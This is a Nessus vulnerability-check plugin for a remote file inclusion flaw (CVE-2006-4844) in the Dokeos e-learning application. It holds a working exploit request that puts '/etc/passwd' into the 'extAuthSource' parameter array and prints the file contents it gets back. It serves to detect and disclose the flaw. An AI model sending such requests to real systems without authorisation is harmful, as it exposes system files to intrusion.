#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP script that is affected by a
remote file inclusion attack. 

Description :

The remote host is running Dokeos, an open-source, e-learning and
course management web application written in PHP. 

The version of Dokeos installed on the remote host fails to sanitize
input to the 'extAuthSource' parameter array before using it to
include PHP code in the 'claroline/inc/claro_init_local.inc.php'
script.  Provided PHP's 'register_globals' setting is enabled, an
unauthenticated attacker may be able to exploit this issue to view
arbitrary files on the remote host or to execute arbitrary PHP code,
possibly taken from third-party hosts. 

Note that, while the vulnerability exists in Claroline itself, Dokeos
is affected as well because it includes a vulnerable version of
Claroline. 

See also :

http://www.gulftech.org/?node=research&article_id=00112-09142006

Solution :

Unknown at this time.

Risk factor :

Medium / CVSS Base Score : 6 
(AV:R/AC:H/Au:NR/C:P/A:P/I:P/B:N)";


if (description)
{
  script_id(22366);
  script_version("$Revision: 1.2 $");

  script_cve_id("CVE-2006-4844");

  script_name(english:"Dokeos extAuthSource Parameter Array Remote File Include Vulnerability");
  script_summary(english:"Tries to read a local file with Dokeos");

  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = make_list("/dokeos", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Make sure the script exists.
  url = string(dir, "/index.php");
  res = http_get_cache(item:url, port:port);
  if (res == NULL) exit(0);

  # If...
  if (
    # it looks like Dokeos and...
    (
      'alt="Dokeos logo"' >< res ||
      'img src="./home/large_dokeos_logo.gif"' >< res
    ) &&
    # it looks like the login form
    egrep(pattern:'<input [^>]*name="login"', string:res)
  )
  {
    # Try to exploit the flaw to read a file.
    file = "/etc/passwd";
    login = string(SCRIPT_NAME, "-", unixtime());  # must not exist
    postdata = string(
      "login=", login, "&",
      "password=nessus&",
      "submitAuth=Enter&",
      "extAuthSource[nessus][newUser]=", file
    );
    req = string(
      "POST ", url, " HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "User-Agent: ", get_kb_item("global_settings/http_user_agent"), "\r\n",
      "Content-Type: application/x-www-form-urlencoded\r\n",
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # There's a problem if...
    if (
      # there's an entry for root or...
      egrep(pattern:"root:.*:0:[01]:", string:res) ||
      # we get an error claiming the file doesn't exist or...
      string("main(", file, "): failed to open stream: No such file") >< res ||
      # we get an error about open_basedir restriction.
      string("open_basedir restriction in effect. File(", file) >< res
    )
    {
      if (egrep(string:res, pattern:"root:.*:0:[01]:"))
      {
        contents = res - strstr(res, "<br");
        if (contents) contents = contents - strstr(contents, "<!DOCTYPE");
      }

      if (contents && report_verbosity)
        report = string(
          desc,
          "\n\n",
         "Plugin output :\n",
          "\n",
          "Here are the contents of the file '/etc/passwd' that Nessus was\n",
          "able to read from the remote host :\n",
          "\n",
          contents
        );
      else report = desc;

      security_warning(port:port, data:report);
      exit(0);
    }
  }
}
